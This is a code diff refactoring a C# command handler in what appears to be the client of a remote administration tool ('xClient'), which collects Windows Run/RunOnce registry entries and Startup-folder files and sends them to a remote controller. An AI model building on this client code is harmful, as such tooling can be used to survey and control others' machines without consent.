@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Core.Information;
@@ -56,46 +57,34 @@ namespace xClient.Core.Commands
         {
             try
             {
-                Dictionary<string, int> startupItems = new Dictionary<string, int>();
+                List<string> startupItems = new List<string>();
 
                 using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                        {
-                            startupItems.Add(formattedKeyValue, 0);
-                        }
+                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                     }
                 }
                 using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                        {
-                            startupItems.Add(formattedKeyValue, 1);
-                        }
+                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                     }
                 }
                 using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                        {
-                            startupItems.Add(formattedKeyValue, 2);
-                        }
+                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                     }
                 }
                 using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                        {
-                            startupItems.Add(formattedKeyValue, 3);
-                        }
+                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                     }
                 }
                 if (OSInfo.Bits == 64)
@@ -104,20 +93,14 @@ namespace xClient.Core.Commands
                     {
                         if (key != null)
                         {
-                            foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                            {
-                                startupItems.Add(formattedKeyValue, 4);
-                            }
+                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                         }
                     }
                     using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                     {
                         if (key != null)
                         {
-                            foreach (string formattedKeyValue in key.GetFormattedKeyValues())
-                            {
-                                startupItems.Add(formattedKeyValue, 5);
-                            }
+                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                         }
                     }
                 }
@@ -125,11 +108,9 @@ namespace xClient.Core.Commands
                 {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
 
-                    foreach (var file in files)
-                    {
-                        if (file.Name != "desktop.ini")
-                            startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 6);
-                    }
+                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
+                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
+                                          select "6" + formattedKeyValue);
                 }
 
                 new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
